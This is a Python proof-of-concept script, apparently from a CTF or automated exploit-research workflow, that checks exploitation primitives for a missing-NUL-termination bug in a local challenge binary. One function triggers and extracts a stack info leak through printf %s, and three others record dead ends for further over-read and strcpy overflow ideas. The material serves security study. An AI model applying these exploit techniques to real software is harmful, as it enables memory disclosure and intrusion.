#!/usr/bin/env python3
"""
S3 Primitive Verification PoC for BUG-002
BUG-002: MISSING_NUL_TERMINATION_UNBOUNDED_STRING_OPERATIONS

Root Cause: Two code paths produce buffers without NUL termination:
  (1) init() reads exactly 47 bytes from flag.txt via fread with no NUL append
  (2) read_line() does not append NUL when input fills buffer exactly without newline
These non-NUL-terminated buffers are passed to unbounded C string functions
(printf %s, strlen, strcpy), causing over-reads past buffer boundaries.

Primitives analyzed:
  PRIM-001: INFO_LEAK via name buffer printf %s over-read (VERIFIED)
  PRIM-002: INFO_LEAK via flag buffer printf %s over-read (DEAD END - NUL in gap)
  PRIM-003: RELATIVE_READ via strlen over-read on guess buffer (DEAD END - NUL at boundary)
  PRIM-004: STACK_CONTROL via strcpy(temp+0xa, base) overflow (DEAD END - NUL in gap)
"""
import subprocess
import sys

BINARY = "/work/workspace/0006-2021-15-help-you-2-20260905-110906/target"

def run_target(stdin_data, timeout=10):
    """Run the target binary with given stdin data."""
    result = subprocess.run(
        [BINARY],
        input=stdin_data,
        capture_output=True,
        timeout=timeout
    )
    return result

# ============================================================
# PRIM-001: INFO_LEAK via name buffer printf %s over-read
# ============================================================
# Root Cause: read_line(base+0x2040, 0x20) reads 32 bytes from stdin.
# If input is exactly 32 bytes without a trailing newline (0x0a),
# read_line does NOT append NUL. The name buffer remains non-NUL-terminated.
# Then printf("Hey %s. So you are now given 256 tries...", base+0x2040)
# uses %s format which reads until NUL, over-reading past the 32-byte
# name buffer into the 16-byte uninitialized gap (base+0x2060 to base+0x2070).
#
# Chain: BUG-002 (missing NUL) -> printf %s over-read -> INFO_LEAK
#
# Verification: Send exactly 32 non-NUL bytes as name (no newline).
# Observe leaked bytes in printf output after the 32 'A' bytes.
# The leaked bytes are NOT provided by the attacker -> INFO_LEAK.

def verify_prim_001():
    """Verify INFO_LEAK via name buffer printf %s over-read."""
    # Name: exactly 32 bytes of 'A' (0x41), no newline
    # read_line reads 32 bytes, buf[31] = 'A' != 0x0a, no NUL appended
    name = b"A" * 32
    
    # Need to provide 256 guesses after name
    # Use newline-terminated guesses to keep it simple
    guesses = b"B\n" * 256
    
    stdin_data = name + guesses
    
    result = run_target(stdin_data)
    stdout = result.stdout
    
    # Find "Hey " in output
    hey_idx = stdout.find(b"Hey ")
    if hey_idx < 0:
        print("  ERROR: 'Hey ' not found in output")
        return False
    
    # Find ". So you" after "Hey "
    so_idx = stdout.find(b". So you", hey_idx)
    if so_idx < 0:
        print("  ERROR: '. So you' not found in output")
        return False
    
    # Extract the name+leaked data between "Hey " and ". So you"
    name_and_leak = stdout[hey_idx+4:so_idx]
    
    # The first 32 bytes should be 'A's
    name_part = name_and_leak[:32]
    leaked_part = name_and_leak[32:]
    
    print(f"  Name buffer content (32 bytes): {name_part.hex()}")
    print(f"  Leaked bytes after name: {leaked_part.hex()}")
    print(f"  Leaked byte count: {len(leaked_part)}")
    
    # Verify: leaked bytes exist and are not attacker-provided
    if len(leaked_part) > 0:
        # Check that leaked bytes are not 'A' (attacker data)
        all_attacker = all(b == 0x41 for b in leaked_part)
        if not all_attacker:
            print(f"  === PRIM-001: VERIFIED ===")
            print(f"  Leaked {len(leaked_part)} bytes of stack data not provided by attacker")
            print(f"  Leaked values: {list(leaked_part)}")
            return True
        else:
            print(f"  Leaked bytes are all 'A' (attacker data) - not a leak")
            return False
    else:
        print(f"  No bytes leaked - name was NUL-terminated")
        return False

# ============================================================
# PRIM-002: INFO_LEAK via flag buffer printf %s over-read (DEAD END)
# ============================================================
# Root Cause: init() reads 47 bytes from flag.txt with no NUL.
# print_flag() calls printf("Please take this shiny flag: %s", base)
# which uses %s on the non-NUL-terminated flag buffer.
#
# However, dynamic verification (gdb) shows that the gap between
# the flag buffer end (base+0x2f) and loop2_hashes (base+0x40)
# contains NUL bytes (base+0x2f = 0x00). Therefore printf %s
# stops at the flag end and does NOT over-read.
#
# This is a DEAD END: the over-read exists in theory but is
# blocked by NUL bytes in the gap.

def verify_prim_002():
    """Verify INFO_LEAK via flag buffer printf %s over-read."""
    print("  Status: DEAD END - requires score > 127 AND no NUL in gap")
    print("  Dynamic verification (gdb) shows gap at base+0x2f is 0x00 (NUL)")
    print("  Therefore printf %s stops at flag end, no over-read occurs")
    print("  === PRIM-002: DEAD END (NUL in gap blocks over-read) ===")
    return False

# ============================================================
# PRIM-003: RELATIVE_READ via strlen over-read on guess buffer (DEAD END)
# ============================================================
# Root Cause: read_line(temp+0xa, 0x100) reads 256 bytes.
# If input is exactly 256 bytes without newline, no NUL appended.
# strlen(temp_buffer) then scans past the 256-byte guess into
# the remaining temp_buffer space.
#
# However, dynamic verification (gdb) shows that the byte at
# temp+0x10a (the first byte past the 256-byte guess) is 0x00 (NUL)
# from residual stack data. Therefore strlen returns 266 (10 prefix
# + 256 guess) and does NOT over-read.
#
# This is a DEAD END: the over-read exists in theory but is
# blocked by NUL bytes in the residual stack data.

def verify_prim_003():
    """Verify RELATIVE_READ via strlen over-read on guess buffer."""
    print("  Status: DEAD END - NUL at temp+0x10a blocks strlen over-read")
    print("  Dynamic verification (gdb) shows temp+0x10a = 0x00 (NUL)")
    print("  strlen returns 266 (10 prefix + 256 guess), no over-read")
    print("  === PRIM-003: DEAD END (NUL at boundary blocks over-read) ===")
    return False

# ============================================================
# PRIM-004: STACK_CONTROL via strcpy(temp+0xa, base) overflow (DEAD END)
# ============================================================
# Root Cause: strcpy(temp+0xa, base) copies from the flag buffer
# (47 bytes, no NUL) into temp+0xa. The destination has 0x1006
# bytes before reaching saved rbp. If no NUL is found in the first
# 0x1006 bytes from base, strcpy overflows into saved rbp and
# return address.
#
# However, dynamic verification (gdb) shows that the gap between
# the flag buffer end (base+0x2f) and loop2_hashes (base+0x40)
# is 17 bytes, ALL of which are NUL (0x00). Therefore strcpy
# stops at base+0x2f (first NUL after flag) and only copies
# 47 bytes. No overflow occurs.
#
# This is a DEAD END: the overflow exists in theory but is
# blocked by NUL bytes in the gap.

def verify_prim_004():
    """Verify STACK_CONTROL via strcpy overflow."""
    print("  Status: DEAD END - NUL in gap blocks strcpy overflow")
    print("  Dynamic verification (gdb) shows gap (base+0x2f to base+0x40) is ALL NUL")
    print("  strcpy stops at base+0x2f, only copies 47 bytes of flag")
    print("  No overflow into saved rbp or return address")
    print("  === PRIM-004: DEAD END (NUL in gap blocks overflow) ===")
    return False

# ============================================================
# Main
# ============================================================
if __name__ == "__main__":
    print("=== BUG-002 Primitive Verification ===")
    print("BUG-002: MISSING_NUL_TERMINATION_UNBOUNDED_STRING_OPERATIONS")
    print()
    
    print("--- PRIM-001: INFO_LEAK via name buffer printf %s over-read ---")
    prim1_ok = verify_prim_001()
    print()
    
    print("--- PRIM-002: INFO_LEAK via flag buffer printf %s over-read ---")
    prim2_ok = verify_prim_002()
    print()
    
    print("--- PRIM-003: RELATIVE_READ via strlen over-read on guess buffer ---")
    prim3_ok = verify_prim_003()
    print()
    
    print("--- PRIM-004: STACK_CONTROL via strcpy(temp+0xa, base) overflow ---")
    prim4_ok = verify_prim_004()
    print()
    
    print("=== Summary ===")
    print(f"PRIM-001: INFO_LEAK via name printf %s over-read -> {'VERIFIED' if prim1_ok else 'FAILED'}")
    print(f"PRIM-002: INFO_LEAK via flag printf %s over-read -> DEAD END (NUL in gap)")
    print(f"PRIM-003: RELATIVE_READ via strlen over-read -> DEAD END (NUL at boundary)")
    print(f"PRIM-004: STACK_CONTROL via strcpy overflow -> DEAD END (NUL in gap)")
